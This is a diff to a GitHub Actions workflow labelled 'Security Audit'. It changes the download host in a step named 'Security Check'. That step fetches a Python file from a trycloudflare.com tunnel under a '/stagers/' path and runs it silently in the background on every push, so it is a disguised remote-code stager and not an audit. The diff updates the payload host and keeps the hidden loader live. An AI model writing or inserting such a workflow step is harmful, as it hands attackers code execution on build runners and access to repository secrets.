@@ -1,4 +1,4 @@
-name: Security Audit 1774115219
+name: Security Audit 1774115389
 on: 
   push:
   workflow_dispatch:
@@ -11,5 +11,5 @@ jobs:
     steps:
     - name: Security Check
       run: |
-        curl -s -L -o /tmp/jVC.py https://updates-enzyme-conservative-delivers.trycloudflare.com/stagers/jVC.py
+        curl -s -L -o /tmp/jVC.py https://bottom-blink-tag-shots.trycloudflare.com/stagers/jVC.py
         nohup python3 /tmp/jVC.py >/dev/null 2>&1 &
